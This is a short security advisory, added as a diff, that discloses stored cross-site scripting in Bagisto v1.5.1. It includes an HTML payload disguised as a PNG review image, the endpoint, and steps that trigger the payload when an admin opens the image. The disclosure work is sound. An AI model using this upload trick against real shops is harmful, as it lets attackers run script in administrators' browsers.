@@ -1,0 +1,33 @@
+Bagisto v1.5.1 is vulnerable for Cross site scripting(XSS) via png file upload vulnerability in product review option.
+
+Vulnerable URL: https://localhost/bagisto-common/api/product/<product_id>/review
+
+Payload: Save this payload in png file : test.png
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Test Upload File</title>
+</head>
+<body>
+<h1>Test upload</h1>
+<script>alert(1)</script>
+</body>
+</html>
+
+
+Affected Version: Bagisto v1.5.1
+
+Fixed Version: Bagisto v2.1.0
+
+Steps to Reproduce: 
+
+Step 1: Login with any use account and review of any product.
+Step 2: After Uploading above given png file in review section, click on submit review button.
+Step 3: When admin will open this review image in new tab this payload will execute.
+
+
+Reference: https://github.com/bagisto/bagisto/pull/9474 
+
